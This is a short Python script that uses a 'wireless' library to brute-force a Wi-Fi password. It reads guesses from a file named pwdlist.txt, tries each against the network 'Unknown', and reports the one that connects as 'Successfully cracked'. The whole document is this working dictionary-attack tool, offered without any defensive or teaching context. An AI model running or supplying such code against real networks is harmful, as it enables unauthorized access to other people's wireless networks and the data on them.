from wireless import Wireless

wire= Wireless()
with open("pwdlist.txt",'r') as file:
    for line in file.readlines():
        if wire.connect(ssid='Unknown', password=line.strip()) ==True:
            print("Successfully cracked with:"+ line.strip())
        else:
            print('[-]'+line.strip()+'Failed!')
